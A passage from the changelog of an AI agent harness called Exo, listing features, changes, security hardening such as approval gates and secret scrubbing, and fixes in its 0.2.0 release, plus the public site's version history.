  the call. Allow always now waits for a separate Confirm always click, as on the Chat card and in the terminal, and
  the card shows every argument of the call.

## [0.2.0] (egg) - 2026-10-13

First tracked version. It covers everything on main since the 0.1.0 scaffold (D-001 to D-054).

### Added
- A standalone core with a protocol-first design: lean Python engine, JSON-RPC protocol, plugins for memory, context,
  gate, bus, command centre and orchestra (D-009, D-010, D-028).
- One agent with one continuous memory, a v2 store, and a learning loop of review, taste and held-out evaluation
  (D-011, D-012, D-013, D-028).
- A Textual terminal client and a web client, with command completion, a providers panel, onboarding (`/intro`,
  tutorial mode), background jobs, peers, handoffs and trace and findings (D-014, D-025, D-026, D-030 to D-032, D-034, D-037).
- A bare `exo` command, an installer that puts it on PATH, `exo web`, and `exo update` (D-035, D-036).
- Providers: decision models (Jev, Laya), a provider-agnostic router with a circuit breaker, a Muse Code
  subscription through the `muse` CLI, and `code_find` through jevgrep (D-015, D-018, D-019, D-029, D-051).
- A house taste pack and baseline export, then fitting the new user (D-044).
- A compulsory tool executor, durable ledger authority with recoverable projections.
- Agent wire format (SYM-2P) for machines and English for people (D-016), and cheapest-model subagent routing (D-017).
- The public site, whitepaper v0.2, user and developer guides, a docs map, CI, and a staging-first deploy (D-042, D-047).

### Changed
- Exo is a standalone harness. Hermes is a source of lifted parts, not a dependency (D-009).
- The gate asks by default, with a shell allowlist, and the store counts as credentials (D-038).
- Esc no longer stops a turn. Focus follows the user, with a larger composer pane (D-043, D-046).
- Consumer path: local first, desktop apps after the build settles (D-050).

### Security
- Approvals bind to the exact text, to who may approve, and pass an outbound scrub (D-033).
- Approval identity comes from the connection, the web token covers every route, one secret scrub (D-039).
- Message authors, pinned keys and an anchored ledger head show who wrote what (D-040).
- Principal authority covers messages, learning and settings. Ruling citations do not skip mandatory checks (D-052, D-054).
- Privacy deny-list, licences in the wheel, owner-only home files, a warning for keys files that are too open (D-042).

### Fixed
- Eight audit bugs no test caught, among them undo, scheduler, summaries and stream errors (D-041).
- Approval cards no longer outlive their request, and the web stream resumes (D-045).
- Tests are hermetic about terminal preferences such as `NO_COLOR` (D-053).
- Accepted transports now close reliably during server shutdown.

## Site

The public site at exo.askaconsult.com. Versions are `site-vMAJOR.MINOR` (docs/VERSIONING.md).

- **v2.0** (2026-10-13, live): the lattice redesign. The living lattice egg on the home page, the roadmap page with linked nodes, the brand page, credits limited to open source and genuine innovators.
- **v2.0-rc.1** (2026-10-13, staging): the approved redesign candidate, commit `6b8800f`.
- **v1.0** (2026-10-12, live): the first public site, commit `8d54b55`. Archive: tag `site-live-2026-10-13`.
